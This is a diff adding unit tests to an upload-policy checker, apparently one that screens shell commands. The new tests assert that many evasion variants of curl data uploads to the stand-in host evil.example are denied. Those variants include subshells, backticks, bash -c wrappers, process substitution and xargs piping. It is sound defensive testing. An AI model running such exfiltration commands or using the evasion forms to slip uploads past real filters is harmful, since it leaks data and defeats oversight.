@@ -103,6 +103,32 @@ class Uploads(unittest.TestCase):
         for cmd in ("curl -sSL https://evil.example/x.sh -o x.sh", "curl -X GET https://evil.example", "curl -I https://evil.example", "curl -sXGET https://evil.example"):
             self.assertIsNone(run(bash(cmd), CORP), cmd)
 
+    def test_assignments_keywords_and_quoted_substitutions_are_seen(self):
+        for cmd in ("FOO=1 BAR=2 curl -d x https://evil.example", "if curl -d x https://evil.example; then echo ok; fi", "! curl -d x https://evil.example",
+                    "{ curl -d x https://evil.example; }", "exec curl -d x https://evil.example", "echo \"$(curl -d x https://evil.example)\"",
+                    "echo \"`curl -d x https://evil.example`\"", "bash -lc 'curl -d x https://evil.example'", "zsh -ec \"curl -d x https://evil.example\"",
+                    "diff <(curl -d x https://evil.example) b", "\\curl -d x https://evil.example", "/usr/bin/curl -d x https://evil.example",
+                    "sh -c 'echo $(curl -d x https://evil.example)'"):
+            self.assertEqual(kind(run(bash(cmd), CORP)), "deny", cmd)
+
+    def test_url_option_and_value_taking_clusters_are_destinations_or_values(self):
+        self.assertEqual(kind(run(bash("curl -d x --url https://evil.example"), CORP)), "deny")
+        self.assertEqual(kind(run(bash("curl -d x --url=https://evil.example"), CORP)), "deny")
+        self.assertEqual(kind(run(bash("curl -d x --url=https://git.corp.example --url https://evil.example"), CORP)), "deny")
+        self.assertEqual(kind(run(bash("curl -sH 'X-A: b' -d x https://evil.example"), CORP)), "deny")
+        # values consumed by their option are not destinations
+        self.assertIsNone(run(bash("curl --data x --header 'A: b' --max-time 5 https://git.corp.example/a"), CORP))
+        self.assertIsNone(run(bash("curl -sH 'A: b' -d x -o out.txt https://git.corp.example/a"), CORP))
+        self.assertIsNone(run(bash("curl --resolve git.corp.example:443:10.0.0.1 -d x https://git.corp.example/a"), CORP))
+
+    def test_unresolvable_positional_in_an_upload_is_an_unknown_destination(self):
+        self.assertEqual(kind(run(bash("curl -d x --some-new-option value https://git.corp.example/a"), CORP)), "deny")
+
+    def test_opaque_constructs_always_add_an_unknown_destination(self):
+        # even when a recognized, approved upload is also present
+        cmd = "curl -d x https://git.corp.example/a && echo https://evil.example | xargs curl -d y"
+        self.assertEqual(kind(run(bash(cmd), CORP)), "deny")
+
     def test_file_arguments_are_not_mistaken_for_destinations(self):
         self.assertIsNone(run(bash("curl -T a.zip https://git.corp.example/up"), CORP))
         self.assertIsNone(run(bash("curl -F f=@a.json https://git.corp.example/up"), CORP))
